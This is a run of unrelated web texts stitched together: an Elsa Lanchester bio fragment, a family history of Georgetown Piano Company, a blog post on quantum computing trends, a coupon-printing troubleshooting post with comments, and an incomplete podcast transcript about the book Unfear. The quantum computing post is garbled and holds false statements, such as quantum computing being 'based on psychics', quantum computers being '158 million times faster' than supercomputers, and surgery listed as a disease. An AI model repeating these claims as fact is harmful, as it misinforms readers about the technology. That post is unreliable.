continuing popularity.\" \u2014Pop Culture Guy\nWhile best known as the Bride of Frankenstein, Elsa Lanchester (1902\u20131986) also played Anne of Cleves in The Private Life of Henry VIII, Katie Nanna in Mary Poppins, the eccentric painter in The Big Clock, and the British cleaning lady who tries to kill Hitler in Passport to Destiny. She was twice nominated for the Best Supporting Actress Academy Award and also enjoyed an extremely distinguished stage career.

{"text": "Georgetown Piano Company was founded in 1935 by my grandfather, Jim Daw. He was a Washington, DC-born musician who played multiple instruments, but specialized in playing the trumpet and the accordion. He was also trained on the piano, and later played the organ quite well. As we all know, 1935, of course, was the heart of the Great Depression. As you can imagine, the clubs around the Washington, DC area did not keep up their pianos, and my grandfather became increasingly frustrated at their state of disrepair. So he finally purchased a tuning hammer, and, without any formal training, began to \"tune\" the pianos, somewhat, to at least make them a little more pleasant to listen to, as well as more acceptable to accompany other instruments. Later, he did attend the Harmony School of Piano Technology in Pennsylvania, earning a degree in piano tuning and repair.\nDuring the late 1930's and early 1940's, he was a member of the United States Navy Band, from which he would later be honorably discharged. Meanwhile, he had formally started, as he called it, his \"one-horse business,\" and christened it Georgetown Piano Company. His initial charge for a tuning: $8.00!! The location of his first store was at 3419 M St., NW (for those of you in the DC area, that`s right across the Key Bridge from Rosslyn, VA into Georgetown), but most interesting was the fact that the phone number was only six digits! I have a business card from that time,\nand the number was HO bart - 6706. The \"Hobart\" was the old way of remembering digits to a number, in this case 4 and 6. His primary business at this time was tuning and repairing, but he also bought and sold new and used pianos. Simultaneously, he was playing music under the title Daw's Music Syndicate, specializing in \"dance music\" and \"floor shows.\" His number for this enterprise was also 6 digits, DU pont - 7078.\nLater, sometime in the early 1950's I believe, he moved the store right up the block on M St. to 3403. Here's a picture from the shop there, with many of the local technicians of the area. My grandfather is standing at far left:\nAnd here's a picture from the 1957 ASPT (the forerunner to today's Piano Technician's Guild) Convention, with my grandfather (seated right, dark jacket w/bow tie) leading the Washington, DC Chapter:\nAt this time, the phone number became 7 digits, with the key word for the first two becoming FE deral 7 - 5160, which translates to 337-5160 - the same number that's in use today! In the latter part of the 1950's, he became somewhat disillusioned with selling pianos, as well as also continuing to rent his store space rather than owning it. At the same time, Georgetown property values were escalating, and his rent was going to be increasing by a dramatic amount. So, rather than continue to \"throw money away,\" he purchased a house in the Clarendon suburb of Arlington, VA right up the road from Rosslyn. He added an office space onto the rear of the house, and converted the basement into his shop, bringing over several of his large workbenches from the Georgetown store, as well as his considerable inventory of piano parts. He gave up buying and selling pianos altogether, saying, \"That's a whole 'nother racket!\" He continued using the name Georgetown Piano Company, and also had the phone company \"run a crow`s line,\" as he put it, from DC to VA so he could keep the previously established phone number. I don`t really know if there`s some special line or not (I doubt it!), but it's now what's known as a \"foreign exchange,\" i.e. a \"202\" area code number that`s operational within the \"703\" area code. At this time, he also gave up being a musician, in order to fully concentrate on the piano business. He was now working as a piano technician for the DC school system, as well as for his own business. He once told me he would do \"3 pianos a day for them, then 3 for myself.\" Below are a few pics from the basement shop on Daniel Street:\nDuring the 1960's and 1970's business continued to be strong (my earliest recollection of the tuning fee during the early 70's was $35), and around 1972 at the age of 5 I began to go on small jobs and appointments with him, as well as to various factories and supply shops. Of course, like I was really paying attention to what was going on! But later, around the age of 10, I began to do small repairs for him in the shop, as his eyesight was diminishing due to diabetes. My favorite job was replacing plastic spinet elbows with wooden ones, and he would marvel at how well I did the job and the speed with which I would complete it. Later, he had me doing more skilled tasks, such as resurfacing/shaping hammers, replacing keytops and hand filing them, replacing hammers, and eventually restringing and rebuilding. But even as I was doing these things, I didn`t see myself getting into the business. It wasn't until I was in my second year of college at George Mason University in 1986 that I began to give it some thought.\nDuring that fall of 1986, I felt strongly that the time was right to take a break from attending college. Initially, I thought maybe 6 months or a year would suffice. I wanted to make some money, so I thought I would go to work with my grandfather, which would help him out in the process. By this time, his eyesight had grown worse, and there had been a succession of guys who had \"worked\" with/for him. I say \"worked\" because frankly, all they were there to do was drive him from one appointment to another. One of them, he said, couldn`t even turn a screwdriver! So by this time, my grandfather was basically reduced to doing tunings and very minor repairs. I figured that together, he and I could start doing more challenging and rewarding (translation: better paying!) jobs. By mid-October of that year, I had reached my decision. I went to his house one night and informed him of my intentions, not quite sure how he would react. He was thrilled, to say the least! So I finished out that semester at GMU, but my heart wasn't really in my schoolwork. I was ready to work, and also to play music. (I'm also a drummer, and by this time had joined my first real band).\nSure enough, within the first few months of 1987, we landed a large rebuilding job, and several moderate repair jobs in the $300-$400 range. Our going rate for a tuning at the time was $55. He was so happy that I had come to work with him, and we thoroughly enjoyed working together. But, he still would not let me tune a piano. He had shown me how to start a tuning on his home piano, but in the customers' homes, he told me to just watch and listen. Slowly, I began to train my ear, and by the end of the year I recall making some smart remarks like, \"Are you sure that's in tune?\" Well, sometime during 1988, we went into a home for a tuning. Without warning, after I had prepped the piano for him to begin, he turned to me and said, \"Okay, now you do it.\" What?!? Um, okay. Knowing he was right there made me feel a little more secure, in case I thoroughly messed up! But, he never really said anything negative, preferring to let me make mistakes and then correct them. Eventually, I became more confident, and we began to tune pianos together, with one of us starting the tuning, and the other finishing. He said he had never really heard of that being done before.\nUnfortunately, his health continued to worsen, and my grandmother had been diagnosed with Alzheimer's disease. So, by 1990, I was doing the majority of the work, while he stayed home and answered calls, booked appointments, took care of bills, etc. I had also become a member of The Master Piano Technicians in 1988, of which my grandfather was already a member. Together we had attended the annual conventions, while I began to accumulate more knowledge in the business of servicing pianos. In July 1994, we had planned to attend the convention in Lancaster, PA., but by this time my grandfather's health had deteriorated severely, so we were unable to go. This was the beginning of the end for my grandfather, and he passed away that August. Needless to say, I was devastated, but I was determined to continue the business.\nToday, Georgetown Piano Company is still going strong, and I hope to continue the business for a long time to come. My wife Carla and I have a wonderful home in Elkridge, Maryland, with a new shop that is fully capable of the most basic repairs up to and including complete rebuilding. Here are a few pictures of the new shop:\nNothing, I repeat, nothing beats working for yourself. Is this the line of work to make millions? Probably not, but as my grandfather said, \"We may not be millionaires, but we try to live like 'em!\"\nBrian A.

{"text": "Home \u00bb Top Quantum Computing Trends To Try\nTop Quantum Computing Trends To Try\nBy Elsa January 6, 2023 No Comments5 Mins Read\nQuantum computing trends are not new for scientists, but many entrepreneurs, researchers, and people like you are talking about them and remembering them right now. For example, IBM, one of the world's biggest IT companies, is spending millions of dollars to reach its first goal for 1000-qubit quantum computers. Google, which runs the most popular search engine in the world, is also interested in quantum technologies and plans to invest in developing quantum computers. Quantum is based on psychics who can see how energy behaves and relates to atomic and subatomic levels, such as the proton and the electron.\nIn terms of computing, quantum apps like superposition (placing one thing on top of or next to another), interference (when two or more electromagnetic waves mix), and entanglement were used to do the relation (a complicated relationship). Quantum computers are devices that can do quantum computing. So, what does quantum computing bring us (business, scientists, astrologers, and people)? Here are some trends and predictions to keep an eye on in quantum computing based on some of the worst analyzers. Even though the technology is still being worked on, it will be long before the first quantum computer works well.\nTop Quantum Computing Trends\nTrends in quantum computing will show up in a lot of places. Of course, Healthcare and AI apps will be the most popular here, but there will be others, like apps for weather forecasting, the stock market, and math analysis.\n1. Healthcare\nQuantum computing will be most focused on the healthcare care market. The technology will give doctors strong hands and solid research results to help them understand and treat serious diseases like cancer, kidney failure, coronary artery bypass surgery, myocardial infarction, and others. Quantum computers are 158 million times faster than current supercomputers and classical classified computers. This is because the technology is fast and can read quickly and efficiently. This way, the healthcare verticals can improve their infrastructure, help doctors make better diagnoses, and gain a competitive edge.\n2. Quantum Random Number Generation\nQuantum random number generation, or QRNG, is a way to check the probability of something by making random numbers from a source with a lot of entropy. Leading companies in this field, like ID Quantique and Quantum Dice, are working to make a high-accuracy mechanism that uses quantum optics to create random sources.\n3. Quantum Key Distribution\nQuantum key distribution is another prediction that will be in the spotlight. QKD is securing a secure way for two parties to talk to each other. So, what are encryption keys used for? Quantum cryptography is used to make encryption keys. It uses quantum principles and mechanics to let two parties make a secret random key that only they know. Messages can also be encrypted or decrypted with these keys. The encryption is very strong, and hackers can't even get through it.\n4. Cybersecurity\nThe next area where trends will have the most trend will be cybersecurity. But it causes both chaos and good things. Technology has a polynomial number of ways to do important world tasks better. But the technology will have some limits and a code of conduct to ensure that people act ethically. For example, quantum cryptography makes quantum computing safe and secure for public transactions. Nearly 65 new methods are being tested to make this happen (a method of encryption to secure and transmit data using properties of quantum mechanics).\n5. Quantum Machine Learning\nAI and machine learning are also improving, which is another trend in quantum computing. Researchers said that the progress of quantum computing would soon leave behind people who use classical computers to connect to the internet. Machine learning is making an impressive pace right now, but those advances will be even bigger with quantum apps. With the help of future quantum technology, machine learning can use escalation and depth module-based algorithms that are hard to do with traditional computers.\n6. Quantum Finance\nYou may not have heard of this before, but it will be one of the top quantum computing trends. Quantum finance is a branch of ecophysics that studies and researches fields using the theories and methods that great quantum economists have developed. Using quantum computing will help a lot to get better results more quickly.\n7. Hybrid Quantum Computing\nPeople talk a lot about this these days. The pace at which future quantum technology is developing makes people guess about hybrid quantum computing. This prediction about quantum computing will start a long record. Hybrid quantum computing usually means that a quantum computer and a regular computer work together to solve a problem.\n8. Quantum Autonomous Transportation\nQuantum computing will also be used in self-driving industries, such as automotive and transportation. Well, Quantum AI can more than give immersive performances in these areas. In addition, several OEMs, tier-one manufacturers, and suppliers can use QAI to run their businesses, handle processes, and do other things.\n9. Weather Forecasting\nThis is one of the most likely and top quantum computing predictions on this list. As a result, forecasters and analysts will be able to learn a lot more about weather patterns, forecasts, and changes in the sky with the help of future quantum technology.\n10. Quantum fault-tolerance\nThis could be hard to understand. It is based on a theorem, which makes it hard to understand at first glance. The theorem talks about a quantum computer with a real error rate under a certain limit that can keep the coherent error rate at random low levels. The best way to understand this theorem is to read about it on Wikipedia or in the author's journal.\nWrapping Up: Quantum Computing Trends\nMy article on Top Quantum Computing Trends is complete.

{"text": "I've share this post in the past, but with the new readers I thought it might be helpful to some of you!\nIt seems that with the recent updates of many browsers and coupon applications, many of you are having some issues printing those great coupons. Some of you can't get Target coupons to print, others have issues iwth Smart Source coupons and others aren't sure what the error messages mean. In order to help everyone answer their questions, I've listed out some of the most common printing issues and some steps you can take to correct them \u2014 or at least understand what they mean.\nI have downloaded the Target software and it keeps telling me to do it again and again \u2014 or my Target coupons just won't print. Well, obviously if you have downloaded it once, you certainly don't need to do it again. Target actually knows that there are some issues and is trying to correct it. The \"best\" solution for now is to just try another browser. So, if you currently use Firefox, try opening up a window in Chrome or Internet Explorer to give it a shot.\nKerry at Totally Target had a super tip she shared with her readers \u2014 if you are unsure if you can print from Target or not, click on a coupon you don't necessarily need or want. That way, if it doesn't print out, you do not \"waste a print.\" The reason is that even if you don't get it to print, your IP address registers and you can have used up a valueable print and have nothing to show for it.\nI can't print anything that is a Smart Source coupon. This is a common problem and often times the fix is simply due to the version of Java that is installed on your computer. Simply complete an update and this can help.\nWhen I try to print Smart Source coupons, I get the message \"Sorry. Your Default Printer Is Not Supported.\" Follow these simple steps to print these coupons (just change them back to the original settings when you are done printing).\nSelect properties and then Advanced.\nSelect the \"Print Directly to Printer\" option.\nIt should now print for you. As mentioned above, make sure to change the settings back when you are done printing. If you still are unable to print, review Smart Source Help resources (go to their page and scroll down to GET HELP).\nI have a mac and have lots of issues trying to get coupons to print. Many sites currently do not support Internet Explorer on Macs. Try to use either Firefox or Safari instead.\nI have tried printing and it won't work \u2013 no matter what. You might try to change your browser to Internet Explorer, Firefox or Safari (depending upon which one you are currently using).\nI've never printed the coupon before, but it says I already did \u2013 can I still get one? That depends. If the coupon starts with http://bricks\u2026\u2026\u2026. you can. When the page loads (but before you tell it to print), scroll down to the bottom of the screen and hit the HELP link. You can request the coupon be mailed to you instead.\nDo you have any other questions/issues printing your coupons? Or, have you found a solution to your own problems when it comes to printing coupons? Please share them with us because someone else might be facing your same issue and you can help them too!\nThis is awesome!! Thanks so much!!!\nGo to Safari, Preferences and click the Advanced tab.\nTick the box that says \"Show Develop menu in menu bar\".\nGo to the Target coupon site.\nClick Develop, User Agent, then Safari 4.0.5-Mac. The page will reload and you should be able to print your coupons!\nThank you!!! This information is MUCH appreciated. Thank you for taking the time to sort it out.\nDarn. Not all of my tricks will work, but many times the do. Sorry it didn't help with your situation.\nA little off topic but related, what does everyone do about printer ink?! It's so expensive and even if I change my settings some coupons print in color anyways. IP coupons are so great and really necessary to score some of the great deals but I'm not sure is the savings are being offset by the cost of the ink. Any suggestions?\nI honestly use Swagbucks to save gift cards and get them discounted. You can also use Ebates and on-line stores so that you can get a sale plus earn cash back.

{"text": "\"Unfear\" with Gaurav Bhatnagar and Mark Minukas\nHome / Podcasts / \"Unfear\" with Gaurav Bhatnagar and Mark Minukas\nHave you ever jumped to a conclusion that was dead wrong? Or assumed that everyone else on your team was seeing the world in the same way as you, but then found out that they saw things very differently?\nMy guests Gaurav Bhatnagar and Mark Minukas are co-authors of Unfear: Transform Your Organization to Create Breakthrough Performance and Employee Well-Being. They explain how the failure to separate what we've actually observed from what is merely our interpretation of the situation often gets us in trouble. They share how we can communicate in a way that recognizes that other people's perceptions, assumptions and reality are different from our own.\nGaurav describes himself as a former \"fear addict\" who had to overturn his two-pronged paradigm that life is a competition and that you either succeed, or you are nothing.\nHe says that becoming aware of the story he told himself was the very first step he had to take in order to shed those limiting beliefs and undergo a total mindset transformation\u2014and it is precisely this principle that he and Mark expound on in their book, Unfear.\nLikewise, Mark grew up believing that you had to \"check your emotions at the door\". He had to rewire his mind and realize that improving how you show up in the world depends on your ability to dig deep and get in touch with your authentic, emotional self.\n\"Separate what you observe from what you interpret,\" Gaurav and Mark teach. This way, you can separate your subjectivity from the objective and be on the same page with the people you're interacting or working with. Start by simply and literally noting what you observe, and from there you may begin to draw conclusions based on the facts.\nIf you find yourself having to navigate a fear-based organization, it may be worth it to hear what the resident \"troublemaker\" has to say\u2014the staff member who isn't afraid to speak their mind and challenge the restrictive status quo. They may just vocalize the same concerns that everyone else in the organization is too afraid to bring up.\nThese organizations\u2014and, really, all organizations\u2014can foster greater collaboration between team members when the leader improves their storytelling ability, as there is no better way to touch your team on the human, emotional level than by communicating via stories.\nAmanda Setili (00:05):\nWe all want to do work that we love. And as leaders, entrepreneurs, and employees, wouldn't it be great to create workplaces where work feels like play, where people are tuned in to the changes going on in the world, around them, where they're constantly learning, starting new opportunities and taking action to go after them. I'm Amanda [inaudible]. And this is the fearless growth podcast where my guests and I will explore the mindsets and choices that lead you and your organization to outstanding performance. Welcome to the fearless growth podcast today. My guests are Guarav button [inaudible] and mark menuca co-authors of the book unfair. It's a book about how to transform your organization to create breakthrough performance and employee wellbeing. Welcome to the show. Gorav and\nGaurav Bhatnager (00:56):\nthank you for having us.\nSo you all have written about a topic that is dear to my heart, how to dispel fear and become more productive and more of a learning organization. So I was so excited to read it. One of the things that I think is very interesting about this is that you bring up in the book is how the stories that we tell ourselves often get in the way of our being able to work effectively with others and our ability to really put on the, the learning mindset, as opposed to the fear mindset. And often these stories come from things that happened. You know, when we were kids, the relationship we had with our siblings, our birth order, how our parents treated us and things like that. And I was just wondering if those kinds of things ever come out during your workshops.\nSo some say that they do Amanda. In fact, we, we encourage them to come out and often the way we do it is by role modeling and going first. And quite honestly, just, just being very honest. I have historically, you know, early in my career being a fear addict and my story coming out of India was that, you know, life is a competition it's really hard. And my story around my fear of failure was you either succeed or you are nothing. And the way you succeed is by, by climbing over the other people. And given that story, I was displaying a lot of dysfunctional behaviors in my own life that were negatively impacting my relationships that was creating burnout in my life. And that was, that was also impacting my personal life and my married life quite dramatically. So, so, you know, we often will role models so we can draw it out from other people. And in actually the first step to transformation is the recognition and the awareness of the story. It's interesting.\nMark Minukas (02:53):\nI think we and myself included, you know, I was kind of taught to check your emotions at the door when you go to work. And that's, you know, not a very pragmatic or effective way to be, you know we, we have all these life experiences and, you know, good experiences and bad experiences and you know, ways in which we've been conditioned to both see the world and enact in the world. And if you want to change how you show up in the world and be more effective, you often have to go deep and really understand why you're feeling and perceiving the way things, the way that you are. So I think it does perhaps, you know, for some people certainly go back to, to childhood,\nKind of bring up another question that I wanted to ask, which is a really important book point that you make in the book, which is you need to separate what you interpret from what you observed. And I think this is so powerful and it, and it kind of ties back to what you just said. You said you could use words like I observed blank. And from that I interpreted blank. I think that's such a useful way to think about it because then you, you can say exactly what did I see here or read. Exactly. And then you can go into what I imagined and made up based on that. And that's a way to bring out your emotions at the same time as being fact-based. This is something you teach people to do\nVery, very critical scale. I mean, it's, it's, you know, oftentimes we perceive the world and we, we immediately assume that that's you know, one accurate and two, you know, true as if everyone else is seeing the world in the same way. And that actually creates a lot of, lot of friction and a lot of challenges in organizations you know, just to, you know, make assertions about the world that other people don't share. And so one thing we teach people, and this is part of, you know, facing your fears is, you know, kind of stepping back and saying, look, you know how I'm seeing the world is one version of it. Let me clarify for people, you know, what some of the assumptions are and how I'm holding my own emotions and my own perceptions and inviting other people into a conversation. So just asserting, you know, I am angry, are you, you've done this to me is not an effective way to communicate. So separating your interpretation from what you're seeing is, is really an important skill to create better conversations at work gore, have anything you want to have.\nAnd I think Amanda, to your question about, do you teach people? I think the one thing you have to teach people is often people say, I observed you are angry. Now you can't observe anger. You can observe behaviors or mannerisms that lead to an interpretation of anger. So the real teaching is to help people understand the distinction between an observation and an Indiana and an interpretation, which people actually don't really have. You know, even simple things like I love. And the example I'll give is, Hey, tell me about this room. Is it a, what kind of room is it? And people will start getting into it's big or it's small. And that's an interpretation. The observation is the exact dimensions of the room. And we often are not clean on that.\nMark. I I'm really curious about the military, cause this seems like it would be a thing that would, I mean, one of many things in your book that would be really useful in the military and often the military is surprisingly ahead of corporate America and the corporate world in terms of this kind of thinking, do they teach things like this as well? I mean about the observation versus interpretation,\nYou know, surprisingly, that's not something I learned in the military. I think there is, there's a lot of thought and training that gets put into being an effective leader in the military. So I think people are already attuned to basic principles like taking care of other people you know, showing up with a degree of humility you know, generally speaking, saying, you know, making it okay to say, you know, I don't know, but let's find out although that's something I, I personally struggled with as a, as a leader in the military, but you're just immersed in a culture that is very focused on training leaders and growing leaders. So I think that's some of what we talk about in the book is certainly reflected in what I learned in the military, but not all. I think there's, there's certainly more that the military can do to improve, you know, emotional intelligence and just improve how leaders use language to create better trust and, you know, advance the conversations that people need to have in the world.\nI'm just always so impressed with people who come from a military background, especially people who went to one of the academies because they always just seem to be so centered. And it's, it's kind of the opposite in the way of the, of the I don't know, the expression people use when they say, oh, this is a really military type culture. And what they mean by that is it's very hierarchical, you know, do what do what you're told command and control or something, but actually the military in some ways, espouses, many of the things that you just spoke about,\nI think it's a bit of a paradox of sorts or maybe a dichotomy. I think there are certainly individuals in the military who can be very centered. And there is a general, you know climate of, you know, hierarchy and they both kind of work together. I mean, it doesn't always mean that there's dysfunction there, but I think like any organization, you know, first off the military is a, is a huge place. So there's a lot of cultures and, you know, different different units or even sub units within a unit will have their own separate cultures. So I think you see, you know, a whole spectrum of, of effectiveness in the military, but I think there is, you know, this, yeah, this tension between training individuals to be quite centered and be able to face any challenger or pressure that that may be thrown at them. And there's a, you know, a general culture of you know, top down hierarchy as well. And there can be friction there,\nYou do your work. Well, those two things can coexist hierarchy where everybody knows. Yeah. There's somebody in charge here who will tell us what the direction is, but also humility about, I don't know how to do this, you know, I can set the vision, but I don't know how to get there. You guys who are down at the lower levels of the organization are the ones who are really going to figure out how we're going to do this. And I think that's when it really works well. Yeah.\nYeah, exactly. I think you need both. I think the fear-based hierarchical organizations have leaders who really want to control everything and don't want to, you know, release the reins. They're trying to you know, get the, the rest of the organization to serve them. I think when it works really well is when the hierarchy creates some structures and conditions that empower the rest of the organization. So it really just depends on how it's done, right.\nConstraints can be freed. Absolutely. Another interesting concept within your book is something we all know to be true, which is that having the right answer in an engineering sensor, a logical sense is useless. If you can't find buy-in. And one of the interesting sub-points to that, that you bring up is you should always enlist the troublemakers in your, in your projects because they're the ones who are going to raise objections and say no, and be the naysayers, but they're doing that because they care. And I think that's a really interesting point. Do you have any good stories about troublemakers that you, that you enlisted and how that turned the situation around\nIs our resident troublemakers? So I'll let him take this one.\nAh, yeah. I, in fact my title should be chief troublemaker. No, you, there, there are some really good stories, but just before I get into the story, Amanda, Amanda, I think the other thing with troublemakers are also, they are really influential within the organization. So they create multiplier effects and there was one particular story which was which is which was there, where we were working in a, in a manufacturing site. And, you know, there was this gentleman who was close to retirement and was really, you know, the first time I saw him, he was sulking and he was really upset about being asked to be part of the part of the change effort. And he was, you know, and everyone would say, oh, you got him as one of your changes. And you're in trouble, man. As it turned out, he was, he was, he was really, really, you know, deeply passionate about, about the work, but he felt that his voice was not being heard.\nAnd as we worked with him and he realized that his voice was, was going to be celebrated in a sensible way, because it's not like everything he was saying was, was right. He suddenly started opening up so much so that, you know, he was saying to the headquarters to represent the site at one point and talk about what was going on, turned out when he was returning back to it, to home. He ended up being on a, on a flight, which was very close to the flight time that I was landing in at this, at this place. And I came out of my flight and I saw and was introduced to this, this person's wife. And she came up to me and said, what have you done to my husband? He's so positive now. And he's, he's, you know, he's, he's so excited about things. And it was, you know, that was deeply meaningful because not only was he actually living in and actually positively impacting the organization, there was something pretty special that happened in his personal life as well. And you know, I still stay in touch with the, with the gentleman because it says become a friendship of a lifetime.\nI think it's so important to recognize the troublemakers because they're often people who are really thinking deeply about the situation and people aren't listening to them because people are, you know, in a fear-based organization just trying to, you know, protect themselves, get the numbers delivered. They don't have time to think about things that deeply or to it. And you know, if the, if the boss says go, right, everybody just goes, okay, let's go. Right. Even if, even if they see problems with it, they may be based on their fear mentality, be moving that direction. And the troublemaker is saying, but wait a second, going right. Has these risks, let's make sure to address these risks. And it's important to listen because the risks are real. Okay.\nIt's super important to listen. And, and, you know, part of the work that we do is we work with, you know, the formal leaders in the organization, but also these informal leaders, because both have to show up differently in order for this to work. So you can imagine in this situation, though, the leaders need to, you know, understand that they need to listen more effectively to people in these troublemakers and not just marginalize them because there is something valuable in here and they can't be filtering this information out. And then the troublemakers have to learn how to show up and actually deliver the things that they care about, deliver those messages in a way that allows other people to hear. Hmm.\nYeah. Then I think the other thing Amanda, is that when you're working with fear, fear is really, really sticky. And the thing is that when, when people have experienced an event, which has led to led to people creating negative stories about fear, they are carried long after the event has happened. And you know, another place where we were working, there was a factory shutdown that happened five years before we had showed up. And it, 90% of the people who were working with us had not been there when the plant shut down and happened. And yet they still talked about how unfair the other side was when the plant shut down and happened. And in that situation, there was so much resistance because anything management said the employees would not buy into anything. The employee said the management would look at with suspicion based on that event that happened five years ago and 90% of them were not there.\nYeah, it's so interesting how these stories can just linger and linger and fester.\nAnd this gets back to that interpretation observation, you know, challenges, a lot of people based on their past experience, you know, start to interpret these events in a certain way, and is often a, you know, a negative story that they're telling about, you know, various events. It could be, you know, the CEO says something like, Hey, we're going to change directions or we're going to do this. It's a very innocuous comment. But based on the past experiences people have, they create this big, huge story about what's actually going on, you know? And, and so helping people untangle, you know, what's actually being said from the story that they have about it helps them, you know, reframe these stories and, and, you know, maybe get out of this negative loop that they're in.\nWell, I think if you can get the leader to be telling the right stories, stories about progress, stories about where we want to go together, stories about customers being delighted with something that we did, it can be really powerful to help turn that around. Do you, do you find that most top leaders are natural storytellers or do you have to teach them? And if you teach them, how do you teach them? How do you get them comfortable with storytelling? And do you have any techniques for getting them to just do it more regularly?\nFortunately, in my experience in mark, yours might be different. Amanda's yours might be different, but I do not think business leaders are actually think storytelling is an important skill. I think most of us as human beings are storytellers by nature because that's how we communicate things. But somehow in the workplace that disappears and it becomes PowerPoint presentations and bullet points. So a lot of our work when we are teaching people about storytelling is helping them understand first through examples, the power of storytelling, but then giving them a structure, which allows them to be storytelling in an authentic way. Because, because if it's all positive, people are not going to buy it. If it's all negative, it's going to collapse people. But where is the middle ground of authenticity? In one of the big ideas we talk to our business leaders about is what is your cathedral story? You know, a brick layer is laying bricks, but if the brick layer thinks that all the he or she is doing is laying breaks, that person shows up with very different energy than a brick layer who thinks is that he or she is building a cathedral, right? And that is the core of it\nWanted to go back. We're going to come back to the storytelling issue, but there was one thing I want to make sure that we hit on Gorav you tell a really interesting story about yourself when you were at McKenzie spending inordinate energy, you said creating and projecting a manufacturer persona that didn't align with my true self. And you said that you had, that you had to ask yourself whether you would try to fit in and survive at a company that didn't value your contribution or step into your uniqueness. Can you tell us anything about that transformation, how that happened?\nI mean, this was, this was a point where, you know, here I was doing work, which is, you know, quite non numbers oriented. And I mean, I'm, I was working in a space where I was working with the mindsets of people and, you know, it's, there's no judgment on this, but McKinsey tends to be, you know, what is measured is what is rewarded and, and people just couldn't figure out, you know, why did clients appreciate what I was doing so much or how to value it? And I was stuck in a fear-based pattern of, oh my God, if I leave McKinsey one, my message would not go out because of how would I go talk to people? And to, you know, as my mother told me at that point, she said, Hey God, if you have young children and what if you are not able to answer living. And so I had to do a lot of reflection about my own stories, about who I was believing into my potential, engaging in conversations with, with my wife to, to, to actually step out of my comfort zone and step into fear so that I could embrace the learning of living a comfortable, but stuck situation to find my true expression. And that was the foundation of co-creation partners. It was about if I want other people to be the way they, I want, I'm asking them to be, I need to step into that myself.\nSo you actually left the firm at this transformation time.\nYes, they did this part of this one. Yes. But again, not because there's anything wrong with the firm,\nBut I needed to\nBe honest with myself and you're creating something amazing that you, that you get to, you get to create, you get to decide with mark what it is, what are we trying to do here? How are we going to do it? Just really fun. Absolutely. Mark, do you want to say anything about how you, and Gorav decided to work together and how this all came together into a cohesive co-creation partners?\n[Inaudible] I was still at the firm and he had recently left to start co-creation partners. And we actually found ourselves working at the same client. I was running a big lean transformation and gore was doing the mindset stuff. And I heard about these mindset workshops that were happening. And I was very skeptical at first. I was like, who is this guy who couldn't hack it at the firm? You know, he's coming in and doing these woo mindset workshops, and he's going to mess up, you know, all the stuff that I'm doing with my, my lean transformation. So I joined some of the workshops, you know, primarily to just check in on this and see what was going on. And, you know, from that first workshop, I was like, wow, this is the missing link. You know, this is a missing piece to a lot of the work that I've been doing is I've always felt this, this gap, you know, would come back to clients six, 12 months later and see that a lot of the work that we had done just wasn't sustained, you know, these brilliant ideas and brilliant plans and transformation efforts that seemed so promising, just, you know, the energy was kind of drained out and, you know, not as much was happening and you know, this, this deeper mindset work and really shifting how people themselves, you know, at the individual level show up was just so powerful.\nSo when I left the firm a few years later garb and I had kept in touch and you know, we started collaborating on, on some, some work and it's been a great collaboration ever since.\nYeah, that's interesting because I noticed that a lot of the techniques, ideas in your book are very aligned with, you know, total quality management and Deming and lean, and a lot of stuff that's come before you're standing on the shoulders of giants, but it's sounds like you were already doing all of that stuff. And you saw that Guarav was doing something new, which was working on the mindsets of the individuals what's inside. And that's very interesting that that's, that was sort of left out. Do you find that that's often missing like that people have everything right, but they're forgetting that one piece.\nI think it's, yeah, it's, it's often missing. So a lot of the, the work you know, in quality management or lean management and agile and design thinking, it deals with, you know, the outer world. So what's kind of happening in the organization. It could be, you know, the processes are there the information that people are using the tools and practices and routines, and that's all great stuff. And the intention of all that is to create learning organizations, to get people, to see problems in new ways and to take creative actions that solve problems and create new outcomes and do it in a very collaborative way, but that's still all happening. You know, it at the sort of organizational system level sort of in the outer world, but oftentimes the reasons why people don't engage with those processes and those practice practices very easily is because of a lot of the, the internal fear that they have. And so if you don't actually, you know, help people step into a learning mindset for themselves as individuals, it's very, very difficult to create, you know, the, the system level change that you want to want to create. And so it's, it's kind of, it's both hands. Yeah.\nAnd just, just, just to build on that, Amanda, I think what often people don't realize is you know, how you see the world conditions, what actions you can take. So if you see the world in a certain way, you have you have one set of actions available to you. And when you see the world in a different way, it opens up new sets of actions and a lot of the lean work and the total quality work is about the actions that need to need to be different. The mindset work allows people to see that there's a whole new set of actions that are available to them. And, you know, Marcus told me, told you about why he wanted to work with me. The reason why I wanted to work with mark was because I think I was doing a lot of really powerful being work, but unless the being is translated into the doing, you don't still have impact. So mark brought two to, to co-creation this view, the strategic view, the system view, as well as the doing view of how do you translate shifted mindset into practical action. And I think that's the distinctiveness of the work, which is it, it works at a both of where the being and doing level.\nIf you all had to name one exercise or experience that you incorporate into your workshops that is most effective at shifting the mindset, shifting, helping people understand where they're coming from and what their worldview view is and how that can change, what would it be? Can you tell us what, tell us a little bit about how, what happens in the workshop?\nWe both times sure have our own favorite. So I'll start, and then mark your jump in. So the one which I love doing in a workshop is I hold a blue colored pen up in my hand, and I say, I'm going to do a magic trick now. And you know, I first, what I do is I just opened my hand and I let the pen drop and I tell people there's only one right answer. And what do you think the answer is? Why did the pen form? And most people would say, it's gravity. And then what I do is I can nice and now the magic is going to happen. I go abracadabra, the da, whatever. And then I call onto the pen and the pen doesn't fall. And I say, how come the pen is not falling? And they say, oh, you held onto it.\nBut I said, but then I tell them what you said, answer is gravity and did gravity magically disappear. And that leads to a really interesting conversation because what it certainly helps people realize is that people don't focus on the things that are in their control. And they often blame the circumstances or the situation for, for, for what is going on, which we call a victim mindset. And the big idea with this little exercise is to show that if you approach the situation with mastery, yes, gravity exists. And yet we have a choice in terms of how we show up in the situation. And that choice allows us to be effective. And just a simple little thing like that creates and makes the light bulb go off. And you can almost see people's eyes light up say, oh my God, I didn't realize how I was disempowering myself.\nDo you find that you need to change anything about how these people are being led before that, or maybe only be a week before, but you know, to have the li their leadership, except that they're going to be coming up with new ideas, they're going to be thinking that they're more powerful than they thought they were and you better be ready for it.\nSo we flip it around. What we do is we say the leaders need to work on their journey. The change agents need to work on their journey, and then they need to come together. And the idea is, you first need to reflect on yourself and then let's then go and see the experience with new eyes when you work with leadership. So often it is, you know, and yes, the leader needs to come in and say the right words, but actually it's in the self experience and then engaging differently that the magic happens. So we, again, that's why our approach is called inside out. And it's less about what leadership is allowing you to do. It's about what are you allowing yourself to do? And let the leaders also go through the same experience and then bring them together to create something that they did not expect to come out in, in this mark,\nYou have a different answer.\nYeah. I love the one guard gave, but another, you know, favorite sort of inflection point in, in some of the workshops that we run is on interpretation and observation. We, we often do this exercise where you know, the two facilitators in the room, 